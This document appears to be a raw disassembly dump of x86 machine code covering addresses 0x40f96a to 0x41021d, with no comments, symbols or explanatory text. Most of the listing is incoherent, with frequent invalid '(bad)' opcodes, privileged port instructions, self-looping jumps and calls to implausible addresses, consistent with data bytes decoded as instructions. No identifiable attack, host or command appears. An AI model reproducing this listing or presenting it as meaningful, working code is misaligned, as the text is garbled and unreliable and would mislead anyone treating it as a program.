  40f96a:	xlat   BYTE PTR ds:[ebx]
  40f96b:	inc    esp
  40f96c:	test   dh,dh
  40f96e:	std    
  40f96f:	mov    ch,0x7b
  40f971:	fdivp  st(5),st
  40f973:	push   DWORD PTR [esp+esi*2+0x6]
  40f977:	call   0x3ea904
  40f97c:	les    esi,FWORD PTR [edx+eiz*8-0x2095b09]
  40f983:	jne    0x40f9b0
  40f985:	fstp   TBYTE PTR [ebx-0x2093bbc]
  40f98b:	mov    ch,0xb3
  40f98d:	fdivp  st(5),st
  40f98f:	inc    esp
  40f991:	je     0x40f999
  40f993:	call   0x3ea8fc
  40f998:	les    esi,FWORD PTR [edx+ebx*8-0x2093b09]
  40f99f:	jne    0x40f97c
  40f9a1:	fidivr DWORD PTR [esi-0x2]
	...
  40f9b4:	add    BYTE PTR [eax],al
  40f9b6:	adc    al,0xf7
  40f9b8:	std    
  40f9b9:	mov    ch,0x27
  40f9bb:	(bad)  
  40f9bd:	(bad)  
  40f9be:	cli    
  40f9bf:	add    ebp,DWORD PTR [edx+0x75ffd546]
  40f9c5:	mov    ah,0xca
  40f9c7:	outs   dx,DWORD PTR ds:[esi]
  40f9c8:	je     0x40f9c8
  40f9ca:	sar    BYTE PTR [ebp+edi*4-0x51884202],cl
  40f9d1:	jmp    0x40f980
  40f9d3:	pop    edi
  40f9d4:	je     0x40f9bd
  40f9d6:	xchg   DWORD PTR [edi],ebx
  40f9d8:	jne    0x40f9d8
  40f9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9db:	cdq    
  40f9dc:	imul   esi,esi,0xffffff9d
  40f9df:	push   edi
  40f9e0:	imul   ecx,DWORD PTR [ecx-0x18bc0c3],0x47
  40f9e7:	inc    eax
  40f9e8:	ins    BYTE PTR es:[edi],dx
  40f9e9:	inc    BYTE PTR [ebp+0x7d46f454]
  40f9ef:	mov    bh,0x74
  40f9f1:	mov    ah,0x5a
  40f9f3:	mov    bh,0x74
  40f9f5:	(bad)  
  40f9f6:	bound  edx,QWORD PTR [eax]
  40f9f8:	mov    ebp,0xbe8f65fe
  40f9fd:	not    DWORD PTR [ebx-0x4]
  40fa00:	jne    0x40fa00
  40fa02:	push   ebp
  40fa03:	jg     0x40f9f3
  40fa05:	sti    
  40fa06:	(bad)  
  40fa07:	(bad)  
  40fa08:	sbb    al,BYTE PTR [eax]
  40fa0a:	cli    
  40fa0b:	mov    ah,0x41
  40fa0d:	pop    es
  40fa0e:	cli    
  40fa0f:	adc    BYTE PTR [ecx+0x77a879eb],cl
  40fa15:	imul   edi,edx,0xfec951
	...
  40fa2b:	add    BYTE PTR [edi-0x497a958d],ch
  40fa31:	(bad)  
  40fa32:	je     0x40f9bc
  40fa34:	mov    edi,0xb59aebbf
  40fa39:	pushf  
  40fa3a:	add    bh,bh
  40fa3c:	(bad)  
  40fa3d:	jae    0x40faa9
  40fa3f:	pop    es
  40fa40:	cld    
  40fa41:	ss jne 0x40fa42
  40fa44:	outs   dx,DWORD PTR ds:[esi]
  40fa45:	and    BYTE PTR [ebp+0x74],dh
  40fa48:	add    al,BYTE PTR ds:0x6e39b311
  40fa4e:	sbb    eax,0xe908bb4b
  40fa53:	into   
  40fa54:	and    BYTE PTR [eax+0x69],0x40
  40fa58:	leave  
  40fa59:	ins    DWORD PTR es:[edi],dx
  40fa5a:	jnp    0x40fa63
  40fa5c:	shl    BYTE PTR [edi],cl
  40fa5e:	loope  0x40fa63
  40fa60:	cli    
  40fa61:	stc    
  40fa62:	sub    bh,ch
  40fa64:	stc    
  40fa65:	cmp    ebp,DWORD PTR [edx]
  40fa67:	or     dl,bh
  40fa69:	ins    DWORD PTR es:[edi],dx
  40fa6a:	pop    ebx
  40fa6b:	adc    al,0x92
  40fa6d:	pop    ss
  40fa6e:	add    DWORD PTR [edx+edi*8],eax
  40fa71:	stc    
  40fa72:	test   al,0xee
  40fa74:	stc    
  40fa75:	cmp    ebp,DWORD PTR [edx+0x2b7bfa07]
  40fa7b:	jl     0x40fa01
  40fa7d:	test   eax,0xb5c5e66b
  40fa83:	je     0x40fa07
  40fa85:	(bad)  
  40fa86:	lods   al,BYTE PTR ds:[esi]
  40fa87:	je     0x40fa6f
  40fa89:	jo     0x40fa30
  40fa8b:	out    dx,al
  40fa8c:	ins    DWORD PTR es:[edi],dx
  40fa8d:	ins    DWORD PTR es:[edi],dx
  40fa8e:	adc    edx,DWORD PTR [eax+eax*1]
	...
  40faa1:	add    BYTE PTR [edx+0x3e],dl
  40faa4:	cmp    dh,BYTE PTR [ebp+0x54]
  40faa7:	stc    
  40faa8:	test   al,0xef
  40faaa:	adc    BYTE PTR [ebx+ebp*1+0x70],bh
  40faae:	rol    DWORD PTR [esp+ebp*2],cl
  40fab1:	mov    esi,0xee75d449
  40fab6:	xor    DWORD PTR [edx+edi*4-0x19],ebx
  40faba:	sub    al,0x6d
  40fabc:	icebp  
  40fabd:	inc    ebx
  40fabe:	test   eax,0xa03d126
  40fac3:	pop    esi
  40fac4:	xchg   esi,eax
  40fac5:	je     0x40fa55
  40fac7:	cld    
  40fac8:	inc    eax
  40fac9:	sar    DWORD PTR [eax-0x718bba93],cl
  40facf:	add    BYTE PTR [esi],bh
  40fad1:	out    dx,al
  40fad2:	cmc    
  40fad3:	pop    esp
  40fad4:	dec    DWORD PTR [ebp+0x2efe6bba]
  40fada:	fdivr  QWORD PTR [eax-0x2]
  40fadd:	pushf  
  40fade:	ins    DWORD PTR es:[edi],dx
  40fadf:	imul   esi,DWORD PTR [ecx+esi*8+0x51],0xffffffd9
  40fae4:	inc    edx
  40fae5:	push   ss
  40fae6:	dec    esi
  40fae7:	imul   esi,DWORD PTR [ebp+ecx*1+0x61],0xffffffa2
  40faec:	inc    ebp
  40faed:	push   es
  40faee:	dec    esi
  40faef:	cmp    eax,0xd1f9edc1
  40faf4:	mov    al,BYTE PTR ds:0x97d3487a
  40fafa:	es icebp 
  40fafc:	or     edx,ecx
  40fafe:	xchg   ecx,eax
  40faff:	mov    edi,0xac9ddefe
  40fb04:	je     0x40faf2
	...
  40fb16:	add    BYTE PTR [eax],al
  40fb18:	stos   DWORD PTR es:[edi],eax
  40fb19:	cmp    eax,0x79f9ddc1
  40fb1e:	inc    esp
  40fb1f:	mov    ecx,0xed746bae
  40fb24:	and    DWORD PTR ds:0xfee9b64c,ecx
  40fb2a:	mov    edi,0xff4c75de
  40fb2f:	call   0x9db5672d
  40fb34:	mov    esi,0xc9964580
  40fb39:	jl     0x40fb7f
  40fb3b:	jge    0x40fb06
  40fb3d:	lock sti 
  40fb3f:	xchg   BYTE PTR [ebx+0x60],al
  40fb42:	(bad)  
  40fb43:	hlt    
  40fb44:	shl    DWORD PTR [ebx-0x56],1
  40fb47:	das    
  40fb48:	test   eax,0xcdf48a6a
  40fb4d:	pop    esp
  40fb4e:	mov    ds:0x6804f9e9,al
  40fb53:	push   edi
  40fb54:	xor    ebp,eax
  40fb56:	(bad)  
  40fb57:	mov    esi,0xe91773b1
  40fb5c:	stc    
  40fb5d:	(bad)  
  40fb5e:	mov    edi,0xe8fd4600
  40fb63:	cwde   
  40fb64:	adc    ecx,DWORD PTR [eax]
  40fb66:	add    BYTE PTR [ebx+0x47f44933],cl
  40fb6c:	mov    ds:0xe439e807,al
  40fb71:	pop    es
  40fb72:	add    BYTE PTR [ebx],al
  40fb74:	add    ebp,edx
  40fb76:	jae    0x40fb60
  40fb78:	jnp    0x40fb77
  40fb7a:	inc    edi
  40fb7b:	inc    ecx
	...
  40fb8c:	add    BYTE PTR [eax],al
  40fb8e:	jecxz  0x40fbdd
  40fb90:	out    0xd3,al
  40fb92:	fild   DWORD PTR [edi]
  40fb94:	add    BYTE PTR [ebx],cl
  40fb96:	adc    ebp,DWORD PTR [esi+0x0]
  40fb99:	jmp    0x40fbd0
  40fb9b:	jmp    0x4587:0xe286880e
  40fba2:	mov    bh,0x4f
  40fba4:	push   es
  40fba5:	dec    eax
  40fba6:	rol    BYTE PTR [eax],cl
  40fba8:	push   esi
  40fba9:	call   0x40fb17
  40fbae:	cwde   
  40fbaf:	(bad)  
  40fbb0:	jae    0x40fbb4
  40fbb2:	test   al,0x54
  40fbb4:	mov    eax,esi
  40fbb6:	sub    ebp,DWORD PTR [ecx+0x46]
  40fbb9:	inc    ecx
  40fbba:	arpl   di,cx
  40fbbc:	cld    
  40fbbd:	push   ss
  40fbbe:	arpl   WORD PTR [edi],ax
  40fbc0:	add    esi,eax
  40fbc2:	jmp    0x3faf:0x5568da6c
  40fbc9:	add    BYTE PTR ds:0x631896c9,dl
  40fbcf:	pop    es
  40fbd0:	or     eax,eax
  40fbd2:	inc    esi
  40fbd3:	add    ebx,ebp
  40fbd5:	cmp    ecx,ecx
  40fbd7:	pop    ss
  40fbd8:	mov    BYTE PTR [ebp-0x6c],dl
  40fbdb:	call   0x3cd9d423
  40fbe0:	loop   0x40fba8
  40fbe2:	adc    eax,DWORD PTR [edi]
  40fbe4:	mov    eax,DWORD PTR [ebp-0x45]
  40fbe7:	mov    ebp,0xd2fafffe
  40fbec:	neg    ebx
  40fbee:	or     eax,0xfe5a50
	...
  40fc03:	add    BYTE PTR [edi-0x36da58b],cl
  40fc09:	sub    DWORD PTR [edx-0x77],esi
  40fc0c:	dec    edi
  40fc0d:	mov    edi,0xe4d6447d
  40fc12:	adc    cl,BYTE PTR [edx+0x447e2b4f]
  40fc18:	ret    0x12f4
  40fc1b:	adc    BYTE PTR [esp+ebx*2],0x1
  40fc1f:	test   DWORD PTR [esi],esp
  40fc21:	sti    
  40fc22:	jno    0x40fc22
  40fc24:	vdivpd xmm4,xmm2,xmm7
  40fc28:	fwait
  40fc29:	mov    eax,ds:0x9987fe71
  40fc2e:	jb     0x40fc7f
  40fc30:	mov    ds:0xa5febe23,al
  40fc35:	push   edi
  40fc36:	add    ebx,DWORD PTR [esi-0x4d]
  40fc39:	sahf   
  40fc3a:	(bad)  
  40fc3b:	jmp    FWORD PTR [edi]
  40fc3d:	out    0x5f,eax
  40fc3f:	inc    BYTE PTR [edi]
  40fc41:	dec    eax
  40fc42:	pop    edx
  40fc43:	aam    0x33
  40fc45:	inc    ebx
  40fc46:	jo     0x40fc52
  40fc48:	mov    edx,0x53681b30
  40fc4d:	sbb    eax,ebx
  40fc4f:	(bad)  
  40fc50:	mov    ebp,0x6548dd43
  40fc55:	mov    ds:0xadec67d3,eax
  40fc5a:	ret    
  40fc5b:	(bad)  
  40fc5c:	fstp   QWORD PTR [ebx+0x2]
  40fc5f:	out    dx,eax
  40fc60:	mov    WORD PTR [esi+ebx*2],es
  40fc63:	inc    esi
  40fc64:	mov    ebx,0xfed25b
	...
  40fc79:	add    bh,al
  40fc7b:	jae    0x40fcd7
  40fc7d:	and    DWORD PTR [edx-0x2c188f0e],0x33fe7120
  40fc87:	add    eax,0xd11dfc2b
  40fc8c:	jno    0x40fcee
  40fc8e:	js     0x40fcd1
  40fc90:	push   esp
  40fc91:	fimul  WORD PTR ds:0x8e70a2dc
  40fc97:	cld    
  40fc98:	push   eax
  40fc99:	in     eax,dx
  40fc9a:	mov    ebx,0x3e7b3d69
  40fc9f:	imul   eax,edx,0xe0efed0d
  40fca5:	pop    ebx
  40fca6:	sahf   
  40fca7:	imul   esp,DWORD PTR ds:0x1e265371,0x715cfdf7
  40fcb1:	jno    0x40fc7f
  40fcb3:	imul   eax,DWORD PTR [edx-0xf103af1],0xfd696a5b
  40fcbd:	jo     0x40fcdc
  40fcbf:	add    eax,0xdc6f60e9
  40fcc4:	add    al,0xc9
  40fcc6:	cmp    al,BYTE PTR ds:0xc4344b51
  40fccc:	call   0xc13e0b41
  40fcd1:	and    BYTE PTR es:[edx-0x33],ch
  40fcd5:	jo     0x40fce5
  40fcd7:	imul   eax,ebp,0x3e5cf5f6
  40fcdd:	mov    BYTE PTR [eax],0x0
	...
  40fcf0:	je     0x40fd5b
  40fcf2:	lahf   
  40fcf3:	inc    ebp
  40fcf4:	stc    
  40fcf5:	add    al,0x14
  40fcf7:	jge    0x40fd4a
  40fcf9:	sub    DWORD PTR [ebx+ecx*2+0x7e9d6964],0xffffffbe
  40fd01:	push   0xf8c67138
  40fd06:	(bad)  
  40fd07:	idiv   ch
  40fd09:	pop    esp
  40fd0a:	sub    al,0x19
  40fd0c:	cli    
  40fd0d:	add    al,0xf2
  40fd0f:	inc    ebx
  40fd10:	add    al,0x80
  40fd12:	jmp    FWORD PTR [eax-0x59fffb08]
  40fd18:	cmp    al,0x71
  40fd1a:	(bad)  
  40fd1b:	call   0xa5080219
  40fd20:	lea    ebp,[edx+0x6]
  40fd23:	jmp    0xc340dc21
  40fd28:	stc    
  40fd29:	fdivp  st(7),st
  40fd2b:	sar    cl,cl
  40fd2d:	ja     0x40fd73
  40fd2f:	xor    eax,0x3d8479c9
  40fd34:	jb     0x40fd9d
  40fd36:	(bad)  
  40fd37:	cdq    
  40fd38:	push   0xfffffff1
  40fd3a:	mul    DWORD PTR [esi]
  40fd3c:	in     al,0x6c
  40fd3e:	out    0xf7,eax
  40fd40:	repnz add al,0x0
  40fd43:	loop   0x40fd7e
  40fd45:	hlt    
  40fd46:	add    al,0x0
  40fd48:	jle    0x40fd4f
  40fd4a:	add    cl,ch
  40fd4c:	mov    eax,ds:0xf9a82798
  40fd51:	addr16 je 0x40fd39
	...
  40fd64:	add    BYTE PTR [eax],al
  40fd66:	push   ecx
  40fd67:	sub    eax,0xb815ee48
  40fd6c:	mov    bh,BYTE PTR [ecx-0x290c7e85]
  40fd72:	and    eax,0x2e3b4f67
  40fd77:	sbb    eax,0x7d15ce48
  40fd7c:	test   BYTE PTR [ecx-0x2e0198fb],ah
  40fd82:	gs (bad) 
  40fd84:	(bad)  
  40fd85:	mov    dh,0x50
  40fd87:	push   0xc5a1f566
  40fd8c:	jmp    DWORD PTR [ebp-0x6109af5d]
  40fd92:	in     eax,0x66
  40fd94:	je     0x40fd77
  40fd96:	mov    cl,0x85
  40fd98:	inc    esi
  40fd99:	mov    ss,ebp
  40fd9b:	jl     0x40fd21
  40fd9d:	add    bl,al
  40fd9f:	out    dx,eax
  40fda0:	std    
  40fda1:	dec    DWORD PTR [ecx]
  40fda3:	add    DWORD PTR [eax+0x3d],ebp
  40fda6:	fild   DWORD PTR [ecx-0x2]
  40fda9:	(bad)  
  40fdaa:	out    dx,al
  40fdab:	mov    eax,0xd794fff5
  40fdb0:	jae    0x40fdba
  40fdb2:	stos   DWORD PTR es:[edi],eax
  40fdb3:	pop    edi
  40fdb4:	inc    ebp
  40fdb5:	jmp    DWORD PTR [ecx+ebp*8-0x2853137d]
  40fdbc:	std    
  40fdbd:	push   0x13
  40fdbf:	dec    esp
  40fdc0:	inc    esp
  40fdc1:	dec    eax
  40fdc2:	mov    ds:0xbb5ff03,al
  40fdc7:	lock std 
  40fdc9:	inc    DWORD PTR [eax]
	...
  40fddb:	add    BYTE PTR [esi+ebp*2],dl
  40fdde:	push   es
  40fddf:	call   0x3e3c8b
  40fde4:	dec    edx
  40fde5:	jle    0x40fdcd
  40fde7:	mul    esp
  40fde9:	xlat   BYTE PTR ds:[ebx]
  40fdea:	mov    eax,DWORD PTR [ebp-0x20fe9]
  40fdf0:	arpl   WORD PTR [ebx+0x4d],cx
  40fdf3:	dec    eax
  40fdf4:	bound  eax,QWORD PTR [ebx]
  40fdf6:	push   DWORD PTR [ebp-0x20ff5]
  40fdfc:	xchg   esp,eax
  40fdfd:	ins    BYTE PTR es:[edi],dx
  40fdfe:	push   es
  40fdff:	call   0x3e3e0b
  40fe04:	or     bh,BYTE PTR [ebp-0x1e]
  40fe07:	mul    DWORD PTR [esi+edx*8+0x3b3b0068]
  40fe0e:	inc    esi
  40fe0f:	inc    ecx
  40fe10:	xchg   ebx,eax
  40fe11:	(bad)  
  40fe12:	mov    bl,0xd8
  40fe14:	lods   al,BYTE PTR ds:[esi]
  40fe15:	(bad)  
  40fe16:	std    
  40fe17:	jmp    FWORD PTR [esi]
  40fe19:	imul   esp,esi,0xfdd81c11
  40fe1f:	mov    esi,ecx
  40fe21:	jecxz  0x40fe18
  40fe23:	push   DWORD PTR [edx+eax*4-0x45]
  40fe27:	lock cli 
  40fe29:	xchg   BYTE PTR [ebp-0x2],ch
  40fe2c:	cli    
  40fe2d:	adc    ebx,ebx
  40fe2f:	cmp    BYTE PTR [edi-0x6f],0x75
  40fe33:	(bad)  
  40fe34:	xor    eax,0x7961f65d
  40fe39:	xor    BYTE PTR [ebx-0xa],bl
  40fe3c:	and    eax,0x7402d6
	...
  40fe51:	add    bl,al
  40fe53:	push   ebp
  40fe54:	add    al,BYTE PTR [eax]
  40fe56:	and    eax,0xea746d87
  40fe5b:	(bad)
  40fe5e:	add    eax,0xab46db6
  40fe63:	outs   dx,BYTE PTR es:[esi]
  40fe65:	(bad)  
  40fe66:	cmc    
  40fe67:	mov    cl,0x12
  40fe69:	call   0xfeae9b10
  40fe6e:	in     eax,0xf1
  40fe70:	pop    esi
  40fe71:	neg    ch
  40fe73:	pop    ds
  40fe74:	outs   dx,BYTE PTR ds:[esi]
  40fe75:	je     0x40fe61
  40fe77:	adc    ecx,DWORD PTR [ecx+0x6e0fcd3f]
  40fe7d:	mov    ah,0xd2
  40fe7f:	movd   mm7,esi
  40fe82:	mov    ebp,0x86e812e9
  40fe87:	pushf  
  40fe88:	ins    DWORD PTR es:[edi],dx
  40fe89:	(bad)  
  40fe8a:	lods   eax,DWORD PTR ds:[esi]
  40fe8b:	sub    DWORD PTR [edi-0xa],ecx
  40fe8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe8f:	push   edi
  40fe90:	ins    BYTE PTR es:[edi],dx
  40fe91:	mov    ah,0x96
  40fe93:	inc    edi
  40fe94:	ins    BYTE PTR es:[edi],dx
  40fe95:	(bad)  
  40fe96:	xchg   ebp,eax
  40fe97:	rcl    DWORD PTR [ebx],1
  40fe99:	call   0xfeae1adc
  40fe9e:	test   DWORD PTR [ecx+0x3f7df663],edx
  40fea4:	ins    BYTE PTR es:[edi],dx
  40fea5:	je     0x40feb1
  40fea7:	push   esp
  40fea8:	fnstcw WORD PTR [edi]
  40feaa:	ins    DWORD PTR es:[edi],dx
  40feab:	scas   eax,DWORD PTR es:[edi]
  40feac:	ins    BYTE PTR es:[edi],dx
  40fead:	je     0x40feb9
  40feaf:	xchg   edi,eax
  40feb0:	mov    dh,0xd7
  40feb2:	gs add eax,0x6da6
	...
  40fec8:	push   esp
  40fec9:	lock lock pop ebx
  40fecc:	retf   
  40fecd:	xchg   bp,ax
  40fecf:	ins    DWORD PTR es:[edi],dx
  40fed0:	inc    esp
  40fed1:	mov    al,0xb0
  40fed3:	jne    0x40ff11
  40fed5:	xchg   ax,ax
  40fed7:	loope  0x40fe91
  40fed9:	gs jge 0x40ff49
  40fedc:	data16 jne 0x40ff5c
  40fedf:	ins    DWORD PTR es:[edi],dx
  40fee0:	and    al,0x5d
  40fee2:	adc    cl,al
  40fee4:	sbb    al,0x66
  40fee6:	gs mov bh,0x21
  40fee9:	outs   dx,BYTE PTR ds:[esi]
  40feea:	pop    ebp
  40feeb:	ins    DWORD PTR es:[edi],dx
  40feec:	adc    eax,0x46ca9b8
  40fef1:	xchg   bx,ax
  40fef3:	pop    esp
  40fef4:	add    al,0x66
  40fef6:	inc    ebp
  40fef7:	pop    esp
  40fef8:	cmp    eax,edx
  40fefa:	cmp    eax,0x4cafec6d
  40feff:	jne    0x40fee5
  40ff01:	gs inc eax
  40ff03:	xor    eax,0x6d256639
  40ff08:	mov    fs,WORD PTR [ebp+edx*1+0x6d]
  40ff0c:	int3   
  40ff0d:	pop    esp
  40ff0e:	(bad)  
  40ff0f:	rol    ah,0x65
  40ff12:	or     eax,0xb55bc5c7
  40ff17:	ins    DWORD PTR es:[edi],dx
  40ff18:	mov    ah,0x65
  40ff1a:	std    
  40ff1b:	div    BYTE PTR [ecx-0x5e981a4]
  40ff21:	add    al,0x20
  40ff23:	inc    edx
  40ff24:	icebp  
  40ff25:	add    al,0x3c
  40ff27:	jns    0x40feca
  40ff29:	and    DWORD PTR [edi+ebp*2+0x0],0x0
	...
  40ff3c:	add    BYTE PTR [eax],al
  40ff3e:	and    eax,DWORD PTR ds:0xef84b943
  40ff44:	loopne 0x40ffa1
  40ff46:	mov    edi,0x826cc5c4
  40ff4b:	mov    edi,0xfce66cbc
  40ff50:	inc    DWORD PTR [eax+0xe]
  40ff53:	mov    ebp,0x30cee940
  40ff58:	aas    
  40ff59:	sar    BYTE PTR [eax],1
  40ff5b:	gs out 0x95,al
  40ff5e:	fsub   QWORD PTR [esi-0x2]
  40ff61:	xchg   esi,eax
  40ff62:	dec    esp
  40ff63:	std    
  40ff64:	addr16 stc 
  40ff66:	add    esp,0x4f810ff
  40ff6c:	add    BYTE PTR [ecx-0x2f],ch
  40ff6f:	arpl   sp,di
  40ff71:	jbe    0x40ff09
  40ff73:	data16 je 0x40ffe3
  40ff76:	mov    ?,eax
  40ff78:	pop    es
  40ff79:	push   ecx
  40ff7a:	sub    BYTE PTR ds:0x43d05eff,ah
  40ff80:	add    ebp,ecx
  40ff82:	sub    al,0x7a
  40ff84:	jmp    0x40fff0
  40ff86:	mov    ch,0x69
  40ff88:	imul   ebp,ecx,0xb4fed0d3
  40ff8e:	icebp  
  40ff8f:	ins    BYTE PTR es:[edi],dx
  40ff90:	hlt    
  40ff91:	not    BYTE PTR [esi+0x63]
  40ff94:	mov    BYTE PTR [ebp+ecx*2+0x36e8ffec],ah
  40ff9b:	mov    ds:0xc5918667,al
  40ffa0:	inc    DWORD PTR [eax+0x0]
	...
  40ffb2:	add    BYTE PTR [eax],al
  40ffb4:	retf   
  40ffb5:	int3   
  40ffb6:	inc    eax
  40ffb7:	jmp    0x1148d90a
  40ffbc:	fs jmp 0x40ffbd
  40ffbf:	(bad)  
  40ffc0:	and    ecx,ebx
  40ffc2:	sti    
  40ffc3:	imul   BYTE PTR [edi-0x462817f4]
  40ffc9:	arpl   si,di
  40ffcb:	mov    al,0x3c
  40ffcd:	or     BYTE PTR [eax],al
  40ffcf:	xor    al,0xd
  40ffd1:	jo     0x40ff53
  40ffd3:	lods   eax,DWORD PTR ds:[esi]
  40ffd4:	cs pop ebx
  40ffd6:	dec    dh
  40ffd8:	add    ecx,ecx
  40ffda:	sti    
  40ffdb:	add    BYTE PTR [ebx],dl
  40ffdd:	lock jae 0x40ffec
  40ffe0:	lods   al,BYTE PTR ds:[esi]
  40ffe1:	push   esi
  40ffe2:	push   es
  40ffe3:	call   0x40f577
  40ffe8:	pop    eax
  40ffe9:	enter  0x850d,0x56
  40ffed:	or     al,BYTE PTR [eax]
  40ffef:	add    BYTE PTR [esi+eax*2+0x85300f6],dl
  40fff6:	add    bh,al
  40fff8:	push   ss
  40fff9:	aad    0xfd
  40fffb:	pop    es
  40fffc:	and    ecx,DWORD PTR [eax]
  40fffe:	push   0x0
  410000:	or     DWORD PTR [ecx],ecx
  410002:	push   0x0
  410004:	stc    
  410005:	or     BYTE PTR [ebp-0x74c758bb],cl
  41000b:	test   DWORD PTR [edi+0x53fffdd7],esi
  410011:	out    dx,eax
  410012:	jae    0x41000c
  410014:	lods   al,BYTE PTR ds:[esi]
  410015:	push   ebp
  410016:	cli    
  410017:	call   0x41001c
	...
  410028:	add    BYTE PTR [eax],al
  41002a:	jge    0x410020
  41002c:	(bad)  
  41002d:	(bad)  
  41002e:	call   0x4a4672fa
  410033:	sar    edi,1
  410035:	call   ebx
  410037:	aas    
  410038:	scas   al,BYTE PTR es:[edi]
  410039:	sub    BYTE PTR [edx-0x308a00f9],dl
  41003f:	mov    edi,0xefec45cf
  410044:	dec    esi
  410045:	mov    eax,DWORD PTR [ebx]
  410047:	fiadd  WORD PTR [ebx-0x2101b0c]
  41004d:	push   eax
  41004e:	xchg   ecx,eax
  41004f:	mov    edi,0xeeac45bf
  410054:	xchg   DWORD PTR [ebp-0x227f5],eax
  41005a:	sti    
  41005b:	test   DWORD PTR [ecx-0x1],0x67fe419c
  410062:	jp     0x410003
  410064:	aas    
  410065:	add    dl,bh
  410067:	cmp    ch,BYTE PTR [edi+0x695285d7]
  41006d:	(bad)  
  41006e:	out    dx,eax
  41006f:	push   ebp
  410070:	pop    edx
  410071:	sbb    DWORD PTR [edi+0x7f8869a2],esi
  410077:	popf   
  410078:	jno    0x410078
  41007a:	pop    ebp
  41007b:	mov    DWORD PTR [ebx],0xc5158a68
  410081:	dec    DWORD PTR [eax+edi*4+0x4a]
  410085:	test   BYTE PTR [ebp+0x7a],0x69
  410089:	je     0x41007d
  41008b:	test   DWORD PTR [ecx+0x43],ebp
	...
  41009e:	add    BYTE PTR [eax],al
  4100a0:	xor    eax,0x1e847b8a
  4100a5:	fisubr DWORD PTR [ecx-0x2]
  4100a8:	nop
  4100a9:	ins    DWORD PTR es:[edi],dx
  4100aa:	fcmovb st,st(4)
  4100ac:	mov    dl,0x2c
  4100ae:	add    al,0xff
  4100b0:	dec    edi
  4100b1:	lds    esi,FWORD PTR [ecx-0x2]
  4100b4:	or     eax,0x1207efc2
  4100b9:	sar    DWORD PTR [esi+0x7fe3fdfe],1
  4100bf:	out    0xed,eax
  4100c1:	retf   
  4100c2:	imul   ecx,DWORD PTR [edi+esi*2-0x1a018e00],0x32ddda7c
  4100cd:	lods   eax,DWORD PTR ds:[esi]
  4100ce:	add    bh,bh
  4100d0:	pop    esp
  4100d2:	jno    0x4100d2
  4100d4:	int    0x3
  4100d6:	lock pop es
  4100d8:	shl    BYTE PTR [eax],cl
  4100da:	mov    edi,0x7fe5bdfe
  4100df:	jecxz  0x41008e
  4100e1:	or     ebp,DWORD PTR [edx+0x69]
  4100e4:	cli    
  4100e5:	jae    0x41015c
  4100e7:	inc    edi
  4100e8:	cmp    ebp,DWORD PTR [ecx+ebp*2-0x4c]
  4100ec:	ret    0x685b
  4100ef:	(bad)  
  4100f0:	xchg   ebp,eax
  4100f1:	add    eax,0xac95fc5c
  4100f6:	and    al,0x69
  4100f8:	test   BYTE PTR [ebx+ebp*2-0x329d7b9c],cl
  4100ff:	ja     0x41017f
  410101:	xor    eax,0x69bd
	...
  410116:	ins    BYTE PTR es:[edi],dx
  410117:	mov    ch,0x50
  410119:	std    
  41011a:	mov    dl,0xc3
  41011c:	call   0xb57ea789
  410121:	imul   edx,DWORD PTR [edx+eiz*2+0x1b],0x248c55fc
  410129:	imul   eax,DWORD PTR [esp+ecx*4+0x6b],0x8d624450
  410131:	test   DWORD PTR [esi+0x55],esi
  410134:	jge    0x41019f
  410136:	sub    al,0x5
  410138:	cmc    
  410139:	fdivr  QWORD PTR [eax-0x60]
  41013c:	test   BYTE PTR [ecx+0x1c],dh
  41013f:	(bad)  
  410140:	call   0xa3c69d34
  410145:	pop    esp
  410146:	add    al,0x62
  410148:	pop    ebp
  410149:	add    al,0x8e
  41014b:	mov    ebx,0x71fa03c0
  410150:	mov    gs,WORD PTR [ecx+0x6e]
  410153:	cmc    
  410154:	push   eax
  410155:	cmp    BYTE PTR [esi],ch
  410157:	bound  edi,QWORD PTR ds:0x3d54ae69
  41015d:	imul   ebx,esp,0xe213b361
  410163:	and    al,0xe7
  410165:	push   0x585361cc
  41016a:	int3   
  41016b:	popa   
  41016c:	adc    eax,0xf54669
  410171:	push   ss
  410172:	hlt    
  410173:	popa   
  410174:	add    eax,0xf56c6669
  410179:	push   0x0
	...
  41018a:	add    BYTE PTR [eax],al
  41018c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41018d:	popa   
  41018e:	(bad)  
  41018f:	jnp    0x41019a
  410191:	ins    DWORD PTR es:[edi],dx
  410192:	add    ebp,DWORD PTR [edi-0x63019cde]
  410198:	xor    eax,0x12defe5b
  41019d:	cdq    
  41019e:	jecxz  0x41017e
  4101a0:	adc    ah,BYTE PTR [ebx-0x2]
  4101a3:	push   esp
  4101a4:	push   cs
  4101a5:	ins    DWORD PTR es:[edi],dx
  4101a6:	ret    
  4101a7:	add    al,0xe3
  4101a9:	(bad)  
  4101aa:	(bad)  
  4101ab:	je     0x410186
  4101ad:	pop    edx
  4101ae:	(bad)  
  4101af:	mov    dh,0xd2
  4101b1:	fmul   DWORD PTR [edi]
  4101b3:	rcr    edi,0x20
  4101b6:	jmp    DWORD PTR [esi-0x69305f8a]
  4101bc:	shl    BYTE PTR [edx-0x1],cl
  4101bf:	sbb    al,0x19
  4101c1:	in     eax,dx
  4101c2:	add    cl,ch
  4101c4:	rcr    BYTE PTR [edi+0x6d09fcfe],cl
  4101ca:	imul   edi,DWORD PTR [edx+edx*4-0x36c3019e],0xa26efe5a
  4101d5:	cwde   
  4101d6:	rcr    DWORD PTR [esi-0x5e],cl
  4101d9:	(bad)  
  4101da:	(bad)  
  4101db:	aam    0xe9
  4101dd:	ins    BYTE PTR es:[edi],dx
  4101de:	mov    edx,DWORD PTR [ebx+edx*4]
  4101e1:	(bad)  
  4101e2:	(bad)  
  4101e3:	aam    0x9
  4101e5:	pusha  
  4101e6:	mov    ah,0x21
  4101e8:	push   0x5f
  4101ea:	(bad)  
  4101eb:	ds aam 0x8
  4101ee:	call   0x4101f4
	...
  4101ff:	add    BYTE PTR [eax],al
  410201:	add    BYTE PTR [eax+0x5f],dl
  410204:	(bad)  
  410205:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410207:	cmp    dh,dh
  410209:	bound  ebp,QWORD PTR es:[eax-0x50]
  41020d:	test   eax,0x5cfe5f52
  410212:	dec    ecx
  410213:	push   edi
  410214:	dec    BYTE PTR [esi]
  410216:	push   ecx
  410217:	stos   BYTE PTR es:[edi],al
  410218:	aas    
  410219:	add    ah,dh
  41021b:	in     al,dx
  41021c:	std    
  41021d:	mov    ch,0xf7
